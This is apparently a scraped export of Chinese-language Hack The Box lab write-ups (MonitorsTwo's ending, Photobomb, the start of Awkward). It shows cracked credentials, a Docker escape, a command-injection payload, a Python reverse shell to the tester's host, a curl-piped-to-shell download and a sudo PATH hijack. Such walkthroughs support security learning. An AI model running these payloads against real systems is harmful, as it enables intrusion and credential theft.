 2 root root 4096 Mar 22 13:21 opt\ndr-xr-xr-x 274 root root    0 May  7 22:45 proc\ndrwx------   1 root root 4096 Mar 21 10:50 root\ndrwxr-xr-x   1 root root 4096 Nov 15 04:17 run\ndrwxr-xr-x   1 root root 4096 Jan  9 09:30 sbin\ndrwxr-xr-x   2 root root 4096 Mar 22 13:21 srv\ndr-xr-xr-x  13 root root    0 May  7 22:45 sys\ndrwxrwxrwt   1 root root 4096 May  7 23:08 tmp\ndrwxr-xr-x   1 root root 4096 Nov 14 00:00 usr\ndrwxr-xr-x   1 root root 4096 Nov 15 04:13 var\n\n```\n首先前往根目录，看到一个脚本 `entrypoint.sh` ，并且看到一个 `.dockerenv` ，怀疑我们当前环境在 docker 容器里\n\n查看一下脚本的内容\n\n```bash\nbash-5.1$ cat entrypoint.sh\ncat entrypoint.sh\n#!/bin/bash\nset -ex\n\nwait-for-it db:3306 -t 300 -- echo \"database is connected\"\nif [[ ! $(mysql --host=db --user=root --password=root cacti -e \"show tables\") =~ \"automation_devices\" ]]; then\n    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql\n    mysql --host=db --user=root --password=root cacti -e \"UPDATE user_auth SET must_change_password='' WHERE username = 'admin'\"\n    mysql --host=db --user=root --password=root cacti -e \"SET GLOBAL time_zone = 'UTC'\"\nfi\n\nchown www-data:www-data -R /var/www/html\n# first arg is `-f` or `--some-option`\nif [ \"${1#-}\" != \"$1\" ]; then\n        set -- apache2-foreground \"$@\"\nfi\n\nexec \"$@\"\n```\n这里可以看到 mysql 的链接地址和登录凭据\n\n构造一下 mysql 语句\n\n```bash\nmysql --host=db --user=root --password=root cacti -e \"show tables\"\nmysql --host=db --user=root --password=root cacti -e \"select * from user_auth\"\n\nadmin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC\nmarcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C\n```\n得到了两个 hash 值\n\n### John\n使用 John 进行爆破\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash\nmarcus:funkymonkey\n\n1 password hash cracked, 0 left\n```\n爆破出来了一个账号密码，使用 ssh 进行登录\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ssh marcus@10.10.11.211\nmarcus@10.10.11.211's password: \nWelcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sun 07 May 2023 11:50:19 PM UTC\n\n  System load:                      0.0\n  Usage of /:                       63.1% of 6.73GB\n  Memory usage:                     12%\n  Swap usage:                       0%\n  Processes:                        227\n  Users logged in:                  0\n  IPv4 address for br-60ea49c21773: 172.18.0.1\n  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1\n  IPv4 address for docker0:         172.17.0.1\n  IPv4 address for eth0:            10.10.11.211\n  IPv6 address for eth0:            dead:beef::250:56ff:feb9:74e1\n\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm or run: sudo pro status\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\nYou have mail.\nLast login: Thu Mar 23 10:12:28 2023 from 10.10.14.40\nmarcus@monitorstwo:~$ whoami&&id\nmarcus\nuid=1000(marcus) gid=1000(marcus) groups=1000(marcus)\n```\n```bash\nmarcus@monitorstwo:~$ ls\nuser.txt\nmarcus@monitorstwo:~$ cat user.txt \n2df2af6924e2b749d747ce39010753e5\n```\n成功拿到 user 权限的 flag 文件\n\n## Root\n在登录 Marcus 的时候，提示我们有一封邮件，去查看一下\n\n```bash\nmarcus@monitorstwo:~$ cat /var/mail/marcus \nFrom: administrator@monitorstwo.htb\nTo: all@monitorstwo.htb\nSubject: Security Bulletin - Three Vulnerabilities to be Aware Of\n\nDear all,\n\nWe would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.\n\nCVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.\n\nCVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.\n\nCVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.\n\nWe encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.\n\nBest regards,\n\nAdministrator\nCISO\nMonitor Two\nSecurity Team\n```\n这里提到了三个 CVE 漏洞，按照情况分析，应该是第三个 CVE-2021-41091\n\n> [https://github.com/UncleJ4ck/CVE-2021-41091](https://github.com/UncleJ4ck/CVE-2021-41091)\n\n该漏洞利用有三个步骤\n\n1. 在 docker 容器中获得 root 权限\n2. 在 docker 容器中使用 `chmod u+s /bin/bash` 设置 `/bin/bash` 的权限\n3. 执行 poc\n\n现在来进行利用\n\n### Step 1\n```bash\nwww-data@50bca5e748b0:/var/www/html$ find / -perm -u=s -type f 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null\n/usr/bin/gpasswd\n/usr/bin/passwd\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/newgrp\n/sbin/capsh\n/bin/mount\n/bin/umount\n/bin/su\n```\n查找可以执行的文件\n\n发现一个可疑的 `/sbin/capsh` \n\n> [https://gtfobins.github.io/gtfobins/capsh/](https://gtfobins.github.io/gtfobins/capsh/)\n\n找到了关于 capsh 的提权提示\n\n```bash\nwww-data@50bca5e748b0:/var/www/html$ /sbin/capsh --gid=0 --uid=0 --\n/sbin/capsh --gid=0 --uid=0 --\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root),33(www-data)\n```\n成功提权到 root\n\n### Step 2\n```bash\nchmod u+s /bin/bash\nls -la /bin/bash\n-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash\n```\n给 `/bin/bash` 添加上 s 权限\n\n### Step 3\n```bash\nmarcus@monitorstwo:~$ ./exp.sh \n[!] Vulnerable to CVE-2021-41091\n[!] Now connect to your Docker container that is accessible and obtain root access !\n[>] After gaining root access execute this command (chmod u+s /bin/bash)\n\nDid you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes\n[!] Available Overlay2 Filesystems:\n/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged\n/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged\n\n[!] Iterating over the available Overlay2 filesystems !\n[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged\n[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'\n\n[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged\n[!] Rooted !\n[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged\n[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'\n\n[!] Spawning Shell\nbash-5.1# exit\n```\n执行 exp，成功获取到了容器所在的地址\n\n```bash\nmarcus@monitorstwo:~$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p\nbash-5.1# whoami&&id\nroot\nuid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)\n```\n成功提权到 root\n\n```bash\nbash-5.1# cat /root/root.txt \n45e2b87e322ce4ea1ae7f141fd210579\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Photobomb - Hackthebox","url":"/2023/05/07/Hackthebox/Easy/Hackthebox-Photobomb/","content":"\n# Hackthebox Photobomb\n# 靶场信息\n![](Hackthebox-Photobomb/LDSrVGy7C-CZ7F3nAHq-IuMX_R1fUhShKILYvbBmdYU.png)\n\n# 靶场类型\n![](Hackthebox-Photobomb/Z58a5zra-7yWwrvMrcB3tRTw0RNMOFa0beuFkWJnvaM.png)\n\n# 信息收集\n## Nmap\n```Plain Text\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.182\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-12-20 23:49 EST\nNmap scan report for 10.10.11.182\nHost is up (0.26s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)\n|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)\n|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://photobomb.htb/\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=12/20%OT=22%CT=1%CU=41677%PV=Y%DS=2%DC=T%G=Y%TM=63A290\nOS:81%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)SE\nOS:Q(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%TS=A)OPS(O1=M539ST11NW7%O2=M539ST11NW7%\nOS:O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11NW7%O6=M539ST11)WIN(W1=FE88%W2\nOS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M539NNS\nOS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%\nOS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%\nOS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%\nOS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%\nOS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 995/tcp)\nHOP RTT       ADDRESS\n1   275.46 ms 10.10.14.1\n2   282.41 ms 10.10.11.182\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 48.89 seconds\n```\n## Http\n![](Hackthebox-Photobomb/tkGwDpifhm3JtLgP0-ZCkdx83b7cHyEUmLp-ik233gM.png)\n\n会被跳转到域名 photobomb.htb 去加入 hosts 解析\n\n```Plain Text\necho 10.10.11.182 photobomb.htb >> /etc/hosts\n```\n![](Hackthebox-Photobomb/2jMWJ9zAeBFV-5nrxU0G9On-hDUfjEYANzQJJxYr4gs.png)\n\n再访问一次就是正常的了\n\n![](Hackthebox-Photobomb/ZYCIfyfoZq4528NhfhqdT6QmomoMT6Ve6yc7QsMDChc.png)\n\n首页有个 click here，点击后会跳转登陆页面，去找一下密码\n\n![](Hackthebox-Photobomb/9_2oS_8TL0oUNogTS5JsVPuln6yEQhwJ06j0S6TBFFo.png)\n\n在 js 文件中发现一段 photobomb.js\n\n```javascript\nfunction init() {\n  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me\n  if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) {\n    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');\n  }\n}\nwindow.onload = init;\n```\n在里面找到了一段链接，里面应该就是账号密码了\n\n![](Hackthebox-Photobomb/CJ4wo47Fx8GJ9YWKdqI0UuQCpMIc71t2WfwPkzPuGYI.png)\n\n登陆成功\n\n![](Hackthebox-Photobomb/ZzlaUOXNz-uE93DbPVB_jlejAXtCfmbang9vUvL8do0.png)\n\n他下面有个下载图片的功能，抓个包看看\n\n![](Hackthebox-Photobomb/kc8KUSvk8sbI-nkpWxbaSmWB5dND6Qnt6lMGiFKTyn8.png)\n\n确实是下载，但是这个参数看着很有搞头啊，这看着就是很明显的命令拼接执行\n\n![](Hackthebox-Photobomb/9apax9ywCGMJ0KkdoHbYX0ycsvCto4mMWgnG58hu2kc.png)\n\n# 漏洞利用\n在 filetype 后面似乎可以拼接，但是没有回显，去开启一个 http 服务器试试\n\n```python\npython3 -m http.server 80\n```\n```Plain Text\nphoto=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;curl+http://10.10.14.11&dimensions=30x20\n```\n然后去请求一下\n\n![](Hackthebox-Photobomb/AuDr59V7VTsfWQtLB40crZN8mIq4O-_Bb8Lb7mMI0hU.png)\n\n确实有回包，那就证明可以执行命令\n\n```python\nexport RHOST=\"10.10.14.11\";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'\n```\n我们构造好 poc 以后，使用 nc 监听一个端口\n\n```bash\nnc -nvlp 4444\n```\n然后去 burp 中执行\n\n```python\nexport RHOST=\"10.10.14.11\";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'\n```\n```python\n┌──(root㉿kali)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.11] from (UNKNOWN) [10.10.11.182] 46772\nwizard@photobomb:~/photobomb$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nwizard@photobomb:~/photobomb$ whoami&&id\nwhoami&&id\nwizard\nuid=1000(wizard) gid=1000(wizard) groups=1000(wizard)\n```\n成功弹回 shell\n\n```python\nwizard@photobomb:~$ cat user.txt\ncat user.txt\n9ef16b54cbd2be4ef91cf67b6642e804\n```\n成功拿到 user 权限的 flag 文件\n\n# 权限提升\n先跑个 linpeas 看看\n\n```python\ncurl -L http://10.10.14.11/linpeas.sh|sh\n```\n```python\nwizard@photobomb:~$ sudo -l\nsudo -l\nMatching Defaults entries for wizard on photobomb:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser wizard may run the following commands on photobomb:\n    (root) SETENV: NOPASSWD: /opt/cleanup.sh\n```\n可以看到，我们可以无密码使用 root 权限执行 /opt/cleanup.sh，先去看看这个文件\n\n```python\n#!/bin/bash\n. /opt/.bashrc\ncd /home/wizard/photobomb\n\n# clean up log files\nif [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]\nthen\n  /bin/cat log/photobomb.log > log/photobomb.log.old\n  /usr/bin/truncate -s0 log/photobomb.log\nfi\n\n# protect the priceless originals\nfind source_images -type f -name '*.jpg' -exec chown root:root {} \\;\n```\n对于这个文件，我们只有读取和写入权限，所以我们得先搞清楚他干了什么\n\n大概看了一下，功能简单的说就是获取日志文件并将其内容移动到 photobonb.log.old，然后使用 truncate 清除 photobomb.log\n\n这里的突破点在于最后一句，他的 find 命令使用的是相对路径，而不是绝对路径，我们就可以改变一下环境变量，然后在当前目录创建一个 find 文件，里面写一个恶意 poc，然后 sudo 执行的时候，就能直接获得我们想要的结果\n\n```python\necho \"/bin/bash\" > find\nchmod +x find\nsudo PATH=$PWD:$PATH /opt/cleanup.sh\n```\n```python\nwizard@photobomb:~$ echo \"/bin/bash\" > find\necho \"/bin/bash\" > find\nwizard@photobomb:~$ chmod +x find\nchmod +x find\nwizard@photobomb:~$ sudo PATH=$PWD:$PATH /opt/cleanup.sh\nsudo PATH=$PWD:$PATH /opt/cleanup.sh\nroot@photobomb:/home/wizard/photobomb# id\nid\nuid=0(root) gid=0(root) groups=0(root)\nroot@photobomb:/home/wizard/photobomb# whoami\nwhoami\nroot\n```\n成功获得 root 权限\n\n```python\nroot@photobomb:/home/wizard/photobomb# cat /root/root.txt\ncat /root/root.txt\naefec07aac4191d73f9f0e8dadd6ee58\n```\n成功获得 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Awkward - Hackthebox","url":"/2023/03/12/Hackthebox/Medium/Hackthebox-Awkward/","content":"\n# Hackthebox - Awkward\n# 靶场信息\n![](Hackthebox-Awkward/qHn3xqiYXz4ZPgf3GJ-T9aWJi1KEis5-ALZN7xlT4Wg.png)\n\n# 靶场类型\n![](Hackthebox-Awkward/SdXchWAqoVujsjsuvkhGk1ZOCGEQBpynHobXTF5tTSk.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.11.185\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-03-11 01:55 CST\nNmap scan report for 10.10.11.185\nHost is up (0.083s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 7254afbaf6e2835941b7cd611c2f418b (ECDSA)\n|_  256 59365bba3c7821e326b37d23605aec38 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=3/11%OT=22%CT=1%CU=37953%PV=Y%DS=2%DC=T%G=Y%TM=640B6F2\nOS:0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST1\nOS:1NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT      ADDRESS\n1   74.06 ms 10.10.16.1\n2   75.37 ms 10.10.11.185\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 29.82 seconds\n```\n## Http\n这边 web 页面指向域名 `hat-valley.htb` ，去做一个 hosts 解析\n\n```bash\necho 10.10.11.185 hat-valley.htb >> /etc/hosts\n```\n![](Hackthebox-Awkward/s2ADAkE-yRjmVY6jcJUpfrNgAeL5baPuLooeftSi52s.png)\n\n似乎是一个什么商城之类的，做找下有没有什么可用信息\n\n## Fuzz\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ffuf -u \"http://hat-valley.htb/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200  \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://hat-valley.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 200\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\ncss                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 404ms]\nstatic                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 386ms]\njs                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 356ms]\n                        [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 98ms]\n:: Progress: [30000/30000] :: Job [1/1] :: 743 req/sec :: Duration: [0:00:54] :: Errors: 2 ::\n```\n跑了一下目录，没什么有用的东西，去跑一下子域名\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ffuf -H \"Host:FUZZ.hat-valley.htb\" -w \"/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\" -u \"http://hat-valley.htb/\" -t 200 -fs 132\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://hat-valley.htb/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.hat-valley.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 200\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n :: Filter           : Response size: 132\n________________________________________________\n\nstore                   [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 76ms]\n:: Progress: [114441/114441] :: Job [1/1] :: 2296 req/sec :: Duration: [0:00:49] :: Errors: 0 ::\n```\n发现一个子域名 `store` ，去加入一下 hosts 解析\n\n```bash\necho 10.10.11.185 store.hat-valley.htb >> /etc/hosts\n```\n然后去访问一下\n\n![](Hackthebox-Awkward/8a9z15RXHkRXEcsxx7byXob8h1cSMJkFUQwb6KqyfMU.png)\n\n提示需要登录，尝试了一下弱口令没有成功，并且 fuzz 了一下也没有可以访问的地址，都是 401\n\n把目光放回到主页面，我们继续 fuzz 下去\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ffuf -u \"http://hat-valley.htb/js/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 -e .js\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://hat-valley.htb/js/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Extensions       : .js \n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 200\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\napp                     [Status: 200, Size: 150, Words: 6, Lines: 1, Duration: 267ms]\napp.js                  [Status: 200, Size: 430202, Words: 15339, Lines: 1640, Duration: 175ms]\ncustom.js               [Status: 200, Size: 8618, Words: 865, Lines: 370, Duration: 135ms]\ncustom                  [Status: 200, Size: 153, Words: 6, Lines: 1, Duration: 230ms]\nplugin                  [Status: 200, Size: 153, Words: 6, Lines: 1, Duration: 240ms]\nplugin.js               [Status: 200, Size: 899759, Words: 60565, Lines: 18950, Duration: 135ms]\n                        [Status: 200, Size: 14351, Words: 1661, Lines: 366, Duration: 575ms]\nrevolution              [Status: 301, Size: 193, Words: 7, Lines: 11, Duration: 286ms]\n:: Progress: [60000/60000] :: Job [1/1] :: 564 req/sec :: Duration: [0:01:46] :: Errors: 4 ::\n```\n![](Hackthebox-Awkward/j5ZGICk1xYW72GWIQs9WnRghOrrqRS_ATcJVBEXuwMg.png)\n\n在 `app.js` 中找到了一个指向 hr 的地址，去访问一下\n\n \n\n![](Hackthebox-Awkward/-BwOtHLOeLyy50Rv5iKDsejC7_bYKTE258Yoh3yXcjs.png)\n\n有一个登陆页面，但测试了一下弱口令没成功\n\n# 漏洞利用\n## 寻找突破点\n![](Hackthebox-Awkward/2u8cLEOiKzUpbjL_JAEHrS-gZ-PKZChX3CVaV-JbKig.png)\n\n查看 `Cookie` 中，发现有一个 token 值是 guest，给它改成 admin 试试\n\n![](Hackthebox-Awkward/ltD-Te3zqjpYgYmBKiGzgU1UxmuwnkAvXvRO9S3V6tc.png)\n\n就直接登录了\n\n![](Hackthebox-Awkward/n6XAUDBfSXnWrAT3xXtmUS2Dfs8mH6pZDgI5PHA6eSQ.png)\n\n这里有个请假申请，但是点了没有反应？抓个包看看\n\n![](Hackthebox-Awkward/6Ju9QTts9sHbU-d1k6BNxqv-Bx6ONQg0Gp7nZOWamww.png)\n\n直接 500 了\n\n![](Hackthebox-Awkward/FIn97059GEfYnGZ1ys0rVr1COWAiVNZxrclWJ9C5WIw.png)\n\n在这里发现了两个接口\n\n```bash\napi/store-status\napi/staff-details\n```\n分别去访问一下呢\n\n![](Hackthebox-Awkward/fUgz-Z8M1YDOGCsVCt4yemb1NpaLxhb3NcSA-6MQwPg.png)\n\n似乎是 JWT 令牌的问题，而 JWT 令牌是必须登录后才有的，但我们现在是通过未授权访问（还是越权？）来进行登录的，所以没有 JWT 令牌。\n\n所以我们现在去退出登录再访问这个页面试试看\n\n![](Hackthebox-Awkward/vVvVIC59OQRwu_OeVmjihwsU4UpheMSBBQ3os-Cg5Hg.png)\n\n我发现我的思路错了，退出登录后还是回有一个 cookie，所以直接删除 cookie 试试\n\n![](Hackthebox-Awkward/qrKPSzIAFIgZWKvg-OHYNqJK-WCQLk_nBrbKOINZ5PY.png)\n\n所以我们直接得到了一些账号密码\n\n使用 `crack station` 来进行破解\n\n> [https://crackstation.net/](https://crackstation.net/)\n\n![](Hackthebox-Awkward/ylHHETQieALkMiXqdgHvo8oAq3Pwjvvno11gripTPq4.png)\n\n得到了一个账号密码\n\n```bash\nusername = christopher.jones\npassword = chris123\n```\n然后我们去 hr 页面登录\n\n![](Hackthebox-Awkward/iy3HWs9a4ANUgIHySTW6s603YQwChIlf9o5tAOPSnZw.png)\n\n登录成功\n\n![](Hackthebox-Awkward/UGyOtuz4HOOqc5TxSzfJY7Zlp_qTt6Mkfho1iWsC82g.png)\n\n然后我们拿到了 JWT Token\n\n```bash\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc4NTUxNDU3fQ.Baca0KhSUCTjcZiDINY0mVs1Tndg78RGwXWLMpwjuZ8\n```\n![](Hackthebox-Awkward/-zPUOYKcPXLNRS_SkEg4RrApECQwKWUV_1UK4IPu2E0.png)\n\n使用 `jwt.io` 访问，可以看到内容相当的简单\n\n但是我在四个用户列表中没有看到什么明显的是管理员的东西\n\n不过 `Christine Wool` 似乎是 CEO，但是 JWT 令牌伪造比较麻烦，而且我看了下靶场类型，偏向于 `Custom Exploitation` 